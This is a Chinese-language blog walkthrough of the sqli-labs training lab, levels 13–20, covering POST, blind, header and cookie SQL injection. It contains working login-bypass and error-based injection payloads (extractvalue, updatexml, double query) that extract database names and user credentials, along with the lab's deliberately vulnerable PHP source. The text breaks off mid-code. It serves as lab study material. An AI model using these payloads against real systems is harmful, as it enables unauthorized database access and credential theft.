<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">成功返回</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Less-13 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">还是那个输入框，输入&#96;&#96;&#96;&#39;&#96;&#96;&#96;,</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;) and  password&#x3D;(&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>

<p>发现是通过<code>(&#39;&#39;)</code>闭合的</p>
<p>输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;) or 1&#x3D;1 ## uname&#x3D;1&#39;) or 1&#x3D;1## &amp;passwd&#x3D;1</span><br></pre></td></tr></table></figure>

<p>成功登录，但是没有回显信息</p>
<p>可以通过or语句判断输入信息是否正确（1=1处）</p>
<h2 id="Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-twist-POST单引号变形双注入" class="headerlink" title="Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)"></a>Less-14 POST - Double Injection - Single quotes- String -twist (POST单引号变形双注入)</h2><p>输入双引号</p>
<p>报错</p>
<figure class="highlight plain"><figcaption><span>have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""" and password</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">注释符不可用</span><br><span class="line"></span><br><span class="line">使双引号闭合</span><br></pre></td></tr></table></figure>
<p>uname: “ or 1=1 or “<br>passwd: 1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure>
<p>uname=” or 1=2 or “  &amp;passwd=admin&amp;submit=Submit</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">登录失败，说明可以在1&#x3D;2处构造</span><br><span class="line"></span><br><span class="line">###### extractvalue(目标xml文档，xml路径)</span><br><span class="line"></span><br><span class="line">对XML文档进行查询的函数</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) and &quot;  &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight xpath"><figcaption><span>syntax error: '~security'```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```sql</span><br><span class="line">uname=admin<span class="string">" and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and "</span>  &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight xpath"><figcaption><span>syntax error: '~5.5.53~'```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## less-15 POST - Blind- Boolian/time Based - Single quotes (基于bool型/时间延迟单引号POST型盲注)</span><br><span class="line"></span><br><span class="line">没有回显</span><br></pre></td></tr></table></figure>
<p>‘ or 1=1 or ‘1’=’2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">登录成功</span><br></pre></td></tr></table></figure>
<p>‘ or 1=(if(substr(version(),1,1)=5,1,0)) or ‘1’=’2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Less-16 POST - Blind- Boolian&#x2F;Time Based - Double quotes (基于bool型&#x2F;时间延迟的双引号POST型盲注)</span><br><span class="line"></span><br><span class="line">上输入什么都没有反应</span><br></pre></td></tr></table></figure>
<p>“) or 1=1 or “1”=(“2</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>admin”)##</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">均登录成功</span><br><span class="line"></span><br><span class="line">可以使用延迟注入</span><br><span class="line"></span><br><span class="line">## Less-17 POST - Update Query- Error Based - String (基于错误的更新查询POST注入)</span><br><span class="line"></span><br><span class="line">页面提示：password reset</span><br><span class="line"></span><br><span class="line">![image-20200814133539931](sqli-labs.assets&#x2F;image-20200814133539931.png)</span><br><span class="line"></span><br><span class="line">&gt;一下转载自：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;ee6446e7f93c</span><br><span class="line">&gt;</span><br><span class="line">&gt;查看源码发现对&#96;user name&#96;表单进行了过滤：</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt;&#96;&#96;&#96;php</span><br><span class="line">&gt;&#x2F;&#x2F; take the variables</span><br><span class="line">&gt;if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))</span><br><span class="line">&gt;&#123;</span><br><span class="line">&gt;&#x2F;&#x2F;making sure uname is not injectable</span><br><span class="line">&gt;$uname&#x3D;check_input($_POST[&#39;uname&#39;]);  </span><br><span class="line">&gt;$passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;<span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">       &#123;</span><br><span class="line">       <span class="comment">// truncation (see comments)</span></span><br><span class="line">       $value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">       <span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">           &#123;</span><br><span class="line">           $value = stripslashes($value);</span><br><span class="line">           &#125;</span><br><span class="line">       <span class="comment">// Quote if not a number</span></span><br><span class="line">       <span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">           &#123;</span><br><span class="line">           $value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">       &#123;</span><br><span class="line">       $value = intval($value);</span><br><span class="line">       &#125;</span><br><span class="line">   <span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure>

<p>函数<code>check_input（）</code>的作用就是检查用户输入，并将用户输入安全化，其中的<code>mysql_real_escape_string()</code>会在<code>\x00, \n, \r, \, &#39;, &quot; and \x1a</code>这些字符前加入反斜线进行转义，防止注入，而且这个函数也避免了宽字节注入的危险。</p>
<p>3.当然，还不止，<code>new password</code>也不是和之前一样轻易试出注入类型，因为有<code>user name</code>的限制，如果<code>new password</code>不对，那么怎么试都自然是错的。因为看了大佬的解题思路，知道了为单引号闭合，SQL语句为：<code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;; $update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</code>且知道有用户名为<code>admin</code>(这个用户名一般都有)。所以就直接考虑构造了。</p>
<p>4.首先考虑到不能回显有意义的信息，所以首选前面一直用的双注入查询 构造如下：<code>user name:</code>填<code>admin</code> ,而<code>new password:</code>填<code>&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-fdde6fea7fe0253f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/951/format/webp"  alt="img"></p>
<p>剩下的构造不多说，和<code>Less-13</code>一样，一个一个爆就好。<br>5.在这里，尝试使用一种新的注入方法，基于<code>extractvalue()</code>和<code>updatexml()</code>的报错注入，详情请看: <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fzpy1998zpy%2Farticle%2Fdetails%2F80631036" target="_blank" rel="noopener">学习基于extractvalue()和updatexml()的报错注入</a>，同时，下面的注入丢默认<code>user name:</code>填<code>admin</code><br>6.先使用<code>updatexml()</code>进行注入，构造为<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select version())),1)##</code> 获取相应版本:</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-fac10c084ccff139.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800/format/webp"  alt="img"></p>
<p>获取数据库名称：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-a445854179a5e2a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/808/format/webp"  alt="img"></p>
<p>获取表名：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(table_name,&#39;;&#39;) from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),1)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-22a805a151e67f06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/819/format/webp"  alt="img"></p>
<p>改变<code>limit n,1</code>即可获取其他表名。</p>
<p>获取列名：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(column_name,&#39;;&#39;) from information_schema.columns where table_name=&#39;emails&#39; limit 0,1)),1)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-872949fbf49ec071.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/785/format/webp"  alt="img"></p>
<p>同样，改变<code>limit n,1</code>即可。</p>
<p>获取内容：这样，不行<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(username,&#39;;&#39;,password) from information_schema.tables where table_name=&#39;security&#39; limit 0,1)),1)##</code> 报错如下：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-3b8a2dd34c70530c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/823/format/webp"  alt="img"></p>
<p>这样：也不行<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select concat(username,&#39;;&#39;,password) from security.users limit 0,1)),1)##</code> 报错如下：</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-e7e22cb9fc8a38cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/784/format/webp"  alt="img"></p>
<p>这样：发现可以了，但是<code>password</code>成了0，一下子把所有的用户密码都改成了0，后面的可能就有问题了。<code>&#39; or (select 1 from (select count(*),concat((select concat(username,&#39;: &#39;,password,&#39;;&#39;) from security.users limit 0,1),floor(rand()*2)) as x from security.users group by x) as a)##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-c9450c04670427b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/822/format/webp"  alt="img"></p>
<p>7.使用<code>extractvalue()</code>，和<code>updatexml()</code>十分相似，用法也差不多，甚至看起来跟直观些。构造：<code>&#39; and extractvalue(1,concat(&#39;~&#39;,(select version())))##</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-f35dd602fedb0c24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/771/format/webp"  alt="img"></p>
<p>剩下的语句和<code>updatexml()</code>的类似。</p>
</blockquote>
<h2 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814140630605.png"  alt="image-20200814140630605"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">    $uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">    $passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT  users.username, users.password FROM users 	WHERE users.username=$uname and users.password=$passwd</span></span><br><span class="line"><span class="string">ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line">    <span class="keyword">if</span>($row1)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "##FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">        $insert=<span class="string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)"</span>;</span><br><span class="line">        mysql_query($insert);</span><br><span class="line">        <span class="comment">//echo 'Your IP ADDRESS is: ' .$IP;</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        <span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size = 3 &gt;'</span>;          </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Your User Agent is: '</span> .$uagent;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        print_r(mysql_error());         </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg"  /&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size="3"&gt;'</span>;</span><br><span class="line">        <span class="comment">//echo "Try again looser";</span></span><br><span class="line">        print_r(mysql_error());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;           </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"   /&gt;'</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在插入语句<code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</code>前没有进行过滤</p>
<p>从uagent下手，用burpsuite抓包</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814143227128.png"  alt="image-20200814143227128"></p>
<blockquote>
<p>4.易知，只要保证<code>User-Agent:</code>字段内容，即<code>uagent</code>保持单引号闭合，且使用双查询注入或使用<code>extractvalue()</code>或<code>updatexml()</code>构造相应语句即可（因为是在插入语句中，只能通过报错获取我们想要的信息）。</p>
</blockquote>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814145058890.png"  alt="image-20200814145058890"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200814145117240.png"  alt="image-20200814145117240"></p>
<blockquote>
<p>5.构造语句查询数据库名：<br>构造一：<code>&#39; and updatexml(1,concat(&#39;~&#39;,(select database())),1) and &#39;1&#39;=&#39;1</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-8b4f0d3fd2f8d3c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/893/format/webp"  alt="img"></p>
<p>构造二：<code>&#39; and extractvalue(1,concat(&#39;~&#39;,(select database()))) and &#39;1&#39;=&#39;1</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-028f8d52a66c6242.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/884/format/webp"  alt="img"></p>
<p>构造三：<code>&#39; and (select 1 from (select count(*),concat(database(),&#39;;&#39;,floor(rand()*2)) as x from information_schema.tables group by x)as a) and &#39;1&#39;=&#39;1</code></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="https:////upload-images.jianshu.io/upload_images/9216631-192483d02291c94d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp"  alt="img"></p>
</blockquote>
<h2 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h2><p>回显返回referer</p>
<p>php文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$uagent = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">	$IP = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Your IP ADDRESS is: '</span> .$IP;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">	$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">	$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="comment">//logging the connection parameters to a file for analysis.	</span></span><br><span class="line">	$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">	fwrite($fp,<span class="string">'Referer:'</span>.$uname.<span class="string">"\n"</span>);</span><br><span class="line">	</span><br><span class="line">	fclose($fp);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">	$result1 = mysql_query($sql);</span><br><span class="line">	$row1 = mysql_fetch_array($result1);</span><br><span class="line">		<span class="keyword">if</span>($row1)</span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "##FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">			$insert=<span class="string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')"</span>;</span><br><span class="line">			mysql_query($insert);</span><br><span class="line">			<span class="comment">//echo 'Your IP ADDRESS is: ' .$IP;</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">			<span class="comment">//echo "&lt;br&gt;";</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size = 3 &gt;'</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'Your Referer is: '</span> .$uagent;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			print_r(mysql_error());			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;			</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "##0000ff" font size="3"&gt;'</span>;</span><br><span class="line">			<span class="comment">//echo "Try again looser";</span></span><br><span class="line">			print_r(mysql_error());</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg"  /&gt;'</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用burpsuite将referer改成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer:&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</span><br></pre></td></tr></table></figure>

<p>或者在referer后面加*，使用sqlmap</p>
<h2 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h2><p>输入admin、admin</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821173723827.png"  alt="image-20200821173723827"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">'uname'</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div style=' margin-top:20px;color:#FFF; font-size:24px; text-align:center'&gt; Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color='#FF0000'&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;/div&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div  align='center' style='margin:20px 0px 0px 510px;border:20px; background-color:#0CF; text-align:center;width:400px; height:150px;'&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div style='padding-top:10px; font-size:15px;'&gt;"</span>;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;!--Form to post the contents --&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action=" " name="form1" method="post"&gt;'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' &lt;div style="margin-top:15px; height:30px;"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'   &lt;input type="text"  name="uname" value=""/&gt;  &lt;/div&gt;'</span>;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'   &lt;input type="text" name="passwd" value=""/&gt;&lt;/div&gt;&lt;/br&gt;'</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'   &lt;div style=" margin-top:9px;margin-left:90px;"&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-20.jpg" /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/center&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))   	<span class="comment">// Quote if not a number</span></span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">	</span><br><span class="line">		$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">		$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		$sql=<span class="string">"SELECT  users.username, users.password 